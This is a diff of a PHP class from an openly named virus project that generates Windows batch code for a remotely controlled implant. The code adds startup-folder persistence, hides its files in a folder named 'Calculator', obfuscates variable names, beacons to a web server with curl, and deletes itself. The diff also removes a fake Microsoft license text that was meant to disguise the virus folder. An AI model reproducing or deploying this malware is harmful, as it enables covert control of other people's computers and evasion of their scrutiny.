@@ -1,26 +1,25 @@
-<?php /** @noinspection PhpUnused */
+<?php
 
 namespace Kelvinho\Virus\Attack {
 
     /**
      * Class BaseScript for windows
-     * @package Kelvinho\Virus\Attack
      *
-     * So, a nice thing about this is that you can construct another class, like UNIXScript. Then you can modify the interface
-     * to provide a platform variable, then it will just magically happen on unix-like hosts. This doesn't solve all problems though,
-     * like specific attacks needs to be multi platform too, before this can work. This only solves the init scripts problem.
+     * @package Kelvinho\Virus\Attack
+     * @author Quang Ho <157239q@gmail.com>
+     * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
+     * @license http://www.opensource.org/licenses/mit-license.html  MIT License
      */
     class BaseScriptWin {
         /**
-         * Virus's daemon. Reports back to the web server each interval.
+         * Virus's simple daemon. Reports back to the web server each interval.
          *
          * @param string $virus_id The virus id
          * @return string The shell code
          */
         public static function simpleMain(string $virus_id): string {
-            ob_start();//@formatter:off ?>
+            ob_start(); //@formatter:off ?>
             @echo off
-            timeout <?php echo STARTUP_DELAY . "\n"; ?>
             SetLocal EnableDelayedExpansion
 
             :daemon_loop
@@ -37,9 +36,15 @@ namespace Kelvinho\Virus\Attack {
             )
             goto daemon_loop
 
-            <?php return ob_get_clean();//@formatter:on
+            <?php return ob_get_clean(); //@formatter:on
         }
 
+        /**
+         * Obfuscate any incoming text by replacing variables and whatnot with H{md5 random hash}
+         *
+         * @param string $content
+         * @return string
+         */
         public static function obfuscate(string $content): string {
             $variables = ["unixTime", "daemon_loop", "hash_end",
                 "pickRandomLocation_exploreDir_end", "pickRandomLocation_exploreDir", "pickRandomLocation",
@@ -80,7 +85,7 @@ namespace Kelvinho\Virus\Attack {
          */
         public static function complexMain(string $virus_id, int $clockSpeed = SWARM_CLOCK_SPEED, bool $checkHash = false): string {
             $startup_folder = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-            $devMode = false;
+            $devMode = true;
             $logFile = "C:\\Users\\15723\\Desktop\\log.txt";
             ob_start();//@formatter:off ?>
             @echo off
@@ -334,16 +339,14 @@ namespace Kelvinho\Virus\Attack {
 
         /**
          * Init script. This will be the code initially downloaded and run using the entry point instructions. This will setup several things:
-         * - /current: contain directories named after attack ids, code.cmd in them which contains the shell code
-         * - /new: contain file named after attack ids, with shell codes in them
+         * - /libs/current/{attack_id}/: contain directories named after attack ids, code.cmd in them which contains the shell code
+         * - /libs/utils/: contain 3rd party tools and binaries that can be used by the payloads
          * - /entry.cmd: the virus daemon. script in startup folder will invoke this, and this will constantly report back to the web server
-         * - /worker.cmd: work on an attack, scheduled by entry.cmd
-         * - /unixTime.cmd: echos out the current unix time, can be used by any script
          * - startup/SU.vbs: placed in the startup folder, which will invoke entry.cmd
          *
          * @param string $virus_id The virus's id
          * @param string $user_handle The user handle
-         * @param string|null $homeDirectory
+         * @param string $homeDirectory
          * @return string The shell code
          */
         public static function initStandalone(string $virus_id, string $user_handle, string $homeDirectory = "%appData%\\Calculator"): string {
@@ -375,20 +378,17 @@ namespace Kelvinho\Virus\Attack {
          * @param string $uploadCode The code to upload the results
          * @return string The shell code
          */
-
         public static function payloadConfirmationLoop(string $virus_id, string $attack_id, string $uploadCode): string {
             ob_start();//@formatter:off ?>
-            SetLocal EnableDelayedExpansion
-            set has=false
+            SetLocal EnableDelayedExpansion & set /a trials = 0
             :payload_confirmation_loop
+            set /a trials+=1
+            if %trials% geq <?php echo ATTACK_RETRIES; ?> goto end_payload_confirmation_loop
             <?php echo "$uploadCode\n"; ?>
             timeout <?php echo ATTACK_UPLOAD_RETRY_INTERVAL . "\n"; ?>
-            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do (
-                if "%%i"=="<?php echo $attack_id; ?>" (set has=true)
-            )
-            if "!has!"=="false" (goto end_confirmation_loop)
-            goto payload_confirmation_loop
-            :end_confirmation_loop
+            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do if "%%i"=="<?php echo $attack_id; ?>" goto payload_confirmation_loop
+            :end_payload_confirmation_loop
+            EndLocal
             <?php return ob_get_clean();//@formatter:on
         }
 
@@ -402,28 +402,6 @@ namespace Kelvinho\Virus\Attack {
             ob_start(); ?>
             start /b cmd /c "timeout 3 & rmdir /s /q %~pd0"
             <?php return ob_get_clean();
-        }
-
-        /**
-         * Dummy license text, to make anyone wanders into the virus's folder not suspicious of anything. TL;DR: make it looks legit
-         *
-         * @return string The license text
-         */
-        public static function license(): string {
-            ob_start();//@formatter:off ?>Copyright 2019 Microsoft
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.<?php //@formatter:on
-            return ob_get_clean();
         }
 
         /**
@@ -470,7 +448,7 @@ limitations under the License.<?php //@formatter:on
             exit /b 0
             :checkPermission
             SetLocal EnableDelayedExpansion & copy nul "%~1\12f99f53144294750fe8713d580eda286f4bd95cd9c840db8ab957def8040028" 2>nul 1>&2
-            if "%errorLevel%" == "0" (del "%~1\12f99f53144294750fe8713d580eda286f4bd95cd9c840db8ab957def8040028" & endlocal & set %2=1) else (endlocal & set %2=0)
+            if "%errorLevel%" == "0" (del "%~1\12f99f53144294750fe8713d580eda286f4bd95cd9c840db8ab957def8040028" & EndLocal & set %2=1) else (EndLocal & set %2=0)
             exit /b 0
             :unixTime
             SetLocal EnableExtensions EnableDelayedExpansion
@@ -482,8 +460,5 @@ limitations under the License.<?php //@formatter:on
             exit /b 0
             <?php return ob_get_clean();//@formatter:on
         }
-    }
-
-    class BaseScriptMac {
     }
 }
